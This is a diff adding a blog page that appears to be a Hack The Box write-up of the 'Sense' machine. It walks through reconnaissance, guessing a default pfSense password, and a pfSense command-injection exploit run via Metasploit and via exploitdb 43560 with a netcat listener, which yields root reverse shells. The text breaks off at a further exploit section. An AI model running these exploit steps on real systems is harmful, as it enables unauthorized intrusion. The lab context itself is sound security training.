@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="[map[name:MindYourPrivacy]]">
+<meta name="description" content="exploitdb and msf" />
+<meta name="keywords" content=", exploitdb, metasploit, pfsense" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sense/" />
+
+
+    <title>
+        
+            HTB - Sense :: Poney Island  — Welcome to Pwnie Island
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://0xade1.github.io/$DEV_BASEURL/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://0xade1.github.io/$DEV_BASEURL/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/$DEV_BASEURL/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/$DEV_BASEURL/favicon-16x16.png">
+    <link rel="manifest" href="https://0xade1.github.io/$DEV_BASEURL/site.webmanifest">
+    <link rel="mask-icon" href="https://0xade1.github.io/$DEV_BASEURL/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="shortcut icon" href="https://0xade1.github.io/$DEV_BASEURL/favicon.ico">
+    <meta name="msapplication-TileColor" content="#1b1c1d">
+    <meta name="theme-color" content="#1b1c1d">
+
+
+
+<meta itemprop="name" content="HTB - Sense">
+<meta itemprop="description" content="exploitdb and msf"><meta itemprop="datePublished" content="2020-09-22T00:54:12+08:00" />
+<meta itemprop="dateModified" content="2020-09-22T00:54:12+08:00" />
+<meta itemprop="wordCount" content="573"><meta itemprop="image" content="https://0xade1.github.io/$DEV_BASEURL"/>
+<meta itemprop="keywords" content="exploitdb,metasploit,pfsense," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://0xade1.github.io/$DEV_BASEURL"/>
+
+<meta name="twitter:title" content="HTB - Sense"/>
+<meta name="twitter:description" content="exploitdb and msf"/>
+
+
+
+
+    <meta property="og:title" content="HTB - Sense" />
+<meta property="og:description" content="exploitdb and msf" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sense/" /><meta property="og:image" content="https://0xade1.github.io/$DEV_BASEURL"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-09-22T00:54:12+08:00" />
+<meta property="article:modified_time" content="2020-09-22T00:54:12+08:00" />
+<meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-sink/" /><meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-validation/" /><meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-unobtainium/" /><meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-crossfittwo/" /><meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-gobox/" /><meta property="og:see_also" content="https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-knife/" />
+
+
+
+
+
+    <meta property="article:section" content="htb-openbsd" />
+
+
+
+    <meta property="article:published_time" content="2020-09-22 00:54:12 &#43;0800 &#43;0800" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://0xade1.github.io/$DEV_BASEURL/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text"># cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://0xade1.github.io/$DEV_BASEURL/about/">About</a></li><li><a href="https://0xade1.github.io/$DEV_BASEURL/categories/">Categories</a></li><li><a href="https://0xade1.github.io/$DEV_BASEURL/posts/">Posts</a></li><li><a href="https://0xade1.github.io/$DEV_BASEURL/series/">Series</a></li><li><a href="https://0xade1.github.io/$DEV_BASEURL/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+  <line x1="16" y1="2" x2="16" y2="6"></line>
+  <line x1="8" y1="2" x2="8" y2="6"></line>
+  <line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+
+  2020-09-21 
+
+
+  
+ |
+
+      
+
+      
+
+      
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/$DEV_BASEURL/categories/htb-openbsd/">htb-openbsd</a></span>
+        
+        |
+
+
+      
+        |
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/$DEV_BASEURL/series/htb/">htb</a></span>
+        
+        |
+
+
+      
+
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://0xade1.github.io/$DEV_BASEURL/posts/2020/09/htb-sense/">HTB - Sense</a>
+      </h1>
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://0xade1.github.io/$DEV_BASEURL/tags/exploitdb/">exploitdb</a></span>
+        <span class="tag"><a href="https://0xade1.github.io/$DEV_BASEURL/tags/metasploit/">metasploit</a></span>
+        <span class="tag"><a href="https://0xade1.github.io/$DEV_BASEURL/tags/pfsense/">pfsense</a></span>
+        
+    </p>
+
+
+    </div>
+
+      
+        <div class="post-excerpt">exploitdb and msf</div>
+      
+
+      
+        <figure class="post-cover">
+          <img src="https://www.hackthebox.eu/images/logo-htb.svg" alt="HTB - Sense" />
+
+          
+        </figure>
+      
+
+      <div class="post-content">
+        <h1 id="nmap">nmap</h1>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> -T4 10.10.10.60
+Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-20 20:06 HKT
+Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.60
+Host is up <span style="color:#ff79c6">(</span>0.055s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">65533</span> filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+</code></pre></td></tr></table>
+</div>
+</div><p>Website is pfsense login page</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense   gobuster  dir -k -u https://10.10.10.60 -w /opt/dictionaries/directory-list-2.3-medium.txt -x txt,swp,log,xml,json -t <span style="color:#8be9fd;font-style:italic">50</span>
+<span style="color:#ff79c6">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">===============================================================</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            https://10.10.10.60
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">50</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     txt,swp,log,xml,json
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
+<span style="color:#ff79c6">===============================================================</span>
+2020/09/20 20:31:51 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
+<span style="color:#ff79c6">===============================================================</span>
+/themes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/css <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/includes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/javascript <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/changelog.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+/classes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/widgets <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/tree <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/shortcuts <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/installer <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/wizards <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/csrf <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/system-users.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+/filebrowser <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Found changelog.txt which informs us of a missing vulnerability patch</p>
+<p>Found system-users.txt which contains username rohit with a note about default password</p>
+<p>What defaut password could this be? let&rsquo;s try: sense, pfsense, etc &hellip;</p>
+<p>that works with rohit:pfsense, we could login and see which version of pfsense:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Version 	2.1.3-RELEASE (amd64)
+built on Thu May 01 15:52:13 EDT 2014
+FreeBSD 8.3-RELEASE-p16
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-11749/product_id-21763/Pfsense-Pfsense.html">Vulnerability list</a> for PFsense reveals <a href="https://www.cvedetails.com/cve/CVE-2016-10709/">CVE-2016-10709</a> is a good candidate for the missing vulnerability; and it has an exploit available (exploitdb and metasploit):</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/39709/">https://www.exploit-db.com/exploits/39709/</a></li>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec">https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec</a> (ranked excellent)</li>
+</ul>
+<h1 id="metasploit">Metasploit</h1>
+<p>got the shell</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/unix/http/pfsense_graph_injection_exec
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; info
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.60
+<span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.60
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username rohit
+<span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; rohit
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
+<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; run
+
+<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Detected pfSense 2.1.3-RELEASE, uploading intial payload
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Payload uploaded successfully, executing
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:39110<span style="color:#ff79c6">)</span> at 2020-09-20 13:14:27 +0000
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted gdZ
+
+meterpreter &gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>We collect flags</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
+Server username: root <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
+meterpreter &gt; cat /home/rohit/user.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+meterpreter &gt; cat /root/root.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="without-metasploit">Without metasploit</h1>
+<h2 id="exploitdb-43560">exploitdb 43560</h2>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense searchsploit -p <span style="color:#bd93f9">43560</span>
+  Exploit: pfSense &lt; 2.1.4 - <span style="color:#f1fa8c">&#39;status_rrd_graph_img.php&#39;</span> Command Injection
+      URL: https://www.exploit-db.com/exploits/43560
+     Path: /opt/exploitdb/exploits/php/webapps/43560.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied EDB-ID <span style="color:#6272a4">#43560&#39;s path to the clipboard</span>
+_  sense python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.38 --lport <span style="color:#bd93f9">9000</span> --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+_  sense
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+_  sense nc -lnvp <span style="color:#bd93f9">9000</span>
+Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
+Connection received on 172.19.0.1 <span style="color:#bd93f9">45020</span>
+sh: can&#39;t access tty; job control turned off
+<span style="color:#6272a4"># id</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="exploitdb-39709">exploitdb 39709</h2>
+<p>another exploit but needs rework</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
